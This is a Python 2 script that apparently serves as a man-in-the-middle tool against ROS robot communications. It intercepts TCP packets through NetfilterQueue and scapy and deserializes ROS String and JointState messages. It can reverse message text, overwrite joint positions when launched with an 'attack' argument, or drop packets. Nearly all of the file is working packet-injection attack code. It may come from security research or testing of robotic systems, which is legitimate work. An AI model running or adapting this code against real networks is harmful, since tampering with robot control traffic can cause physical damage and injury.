import os,sys,nfqueue,socket
from scapy.all import *
import random
from cStringIO import StringIO
import struct
import rospy
import numpy
import PyKDL
from tf import transformations
from tf_conversions import posemath
from std_msgs.msg import String, Bool, Float32, Empty
from geometry_msgs.msg import Pose, PoseStamped, Vector3, Quaternion, Wrench, WrenchStamped, TwistStamped
from sensor_msgs.msg import JointState, Joy
from netfilterqueue import NetfilterQueue
import random
import codecs

values = (1.19, 0.0)
counter = 1

def modify(packet):
    try:
        pkt = IP(packet.get_payload())
        if len(str(pkt)) != 85:
            packet.accept()
            print '-----------returned------------'
            return

        b = StringIO()

        b.write(pkt[Raw].load)
        print 'initial len -> %d '%len(str(pkt))
        b.seek(0)
        (size,) = struct.unpack('<I', b.read(4))
        msg = String()
        b.seek(4)
        msg.deserialize(b.read(size))
        print "current msg -> %s"%msg
        msg.data = msg.data[::-1]
        print "reversed -> %s"%msg
        b.seek(4)
        
        msg.serialize(b)
        b.seek(0)
        data = b.read(size+4)
        
 
        del pkt[IP].chksum
        del pkt[TCP].chksum

        pkt[Raw].load = data

        #print pkt
        #print packet._given_payload
        packet.set_payload(bytes(pkt)) #set the packet content to our modified version
        print 'final len -> %d'%len(str(pkt))
        packet.accept()
    except:
        raise

def corrupt_joint_state_packet(packet):
    try:
        #pkt = packet 
        print "---inside---"
        pkt = IP(packet.get_payload())
        init_len = len(str(pkt))
        """
        if len(str(pkt)) != 158:
            packet.accept()
            print '-----------returned------------'
            return
        """
        b = StringIO()
        b.write(pkt[Raw].load)
        
        print 'initial len -> %d '%len(str(pkt))
        
        b.seek(0)
        (size,) = struct.unpack('<I', b.read(4))
        msg = JointState()
        b.seek(4)
        msg.deserialize(b.read(size))
        print "current msg -> %s"%msg
        global counter, values
        print type(msg.position)
        print [0.0, 0.0, values[counter], 0.0, 0.0, 0.0, 0.0]
        counter = (counter + 1) % 2
        print [msg.position[0], 0.0, values[counter], 0.0, 0.0, 0.0, 0.0]
        msg.position = [msg.position[0], 0.0, values[counter], 0.0, 0.0, 0.0, 0.0]
        print "changed -> %s"%msg
        b.seek(4)
        msg.serialize(b)

        b.seek(0)
        data = b.read(size+4)
 
        del pkt[IP].chksum
        del pkt[TCP].chksum

        pkt[Raw].load = data

        #print pkt
        #print packet._given_payload
        final_len = len(str(pkt))
        attack = False
        if(len(sys.argv) > 1):
            attack = sys.argv[1] == 'attack'
        
        if init_len == final_len and attack:
            packet.set_payload(bytes(pkt)) #set the packet content to our modified version
        
        print 'final len -> %d'%len(str(pkt))
        packet.accept()
    except:
        print 'accepted anyway'
        packet.accept()
        pass


def packet_inspector(packet):
    try:
        #pkt = packet 
        #print "---inside---"
        pkt = IP(packet.get_payload())
        if not(Raw in pkt and TCP in pkt):
            packet.accept()
            return
        init_len = len(str(pkt))

        b = StringIO()
        b.write(pkt[Raw].load)

        
        print 'initial len -> %d '%len(str(pkt))
        
        b.seek(0)
        (size,) = struct.unpack('<I', b.read(4))
        msg = String()
        b.seek(4)
        print 'size -> %s'%(size)
        print type(b.read(size))
        b.seek(4)
        msg.deserialize(b.read(size))
        """
        with open('_log_transmission.txt','w') as f:
            print msg.encode('utf-16')
            f.write(msg.encode('utf8'))
        """
        print "current msg -> %s"%msg
        print "len " + str(len(str(msg)))
        print 'final len -> %d'%len(str(pkt))
        
        packet.accept()
    except:
        print 'except'
        packet.accept()

def manipulate_string_randomly():

    return


def drop(packet):
    try:
        #pkt = packet 
        #print "---inside---"
        pkt = IP(packet.get_payload())
        if not(Raw in pkt and TCP in pkt):
            packet.accept()
            return
        init_len = len(str(pkt))

        b = StringIO()
        b.write(pkt[Raw].load)

        
        print 'initial len -> %d '%len(str(pkt))
        
        b.seek(0)
        (size,) = struct.unpack('<I', b.read(4))
        msg = String()
        b.seek(4)
        print 'size -> %s'%(size)
        print type(b.read(size))
        b.seek(4)
        msg.deserialize(b.read(size))
        """
        with open('_log_transmission.txt','w') as f:
            print msg.encode('utf-16')
            f.write(msg.encode('utf8'))
        """
        print "current msg -> %s"%msg
        print "len " + str(len(str(msg)))
        print 'final len -> %d'%len(str(pkt))

        choice = random.randint(0,6)
        if choice == 1 or True:
            packet.drop()
            print 'dropped'
        else:
            print 'accepted'
            packet.accept()
    except:
        print 'except'
        packet.accept()


def main():
    
    nfqueue = NetfilterQueue()
   
    nfqueue.bind(1, packet_inspector) 
    try:
        print "[*] waiting for data"
        nfqueue.run()
    except KeyboardInterrupt:
        pass

if __name__ == '__main__':
    sys.exit(main())

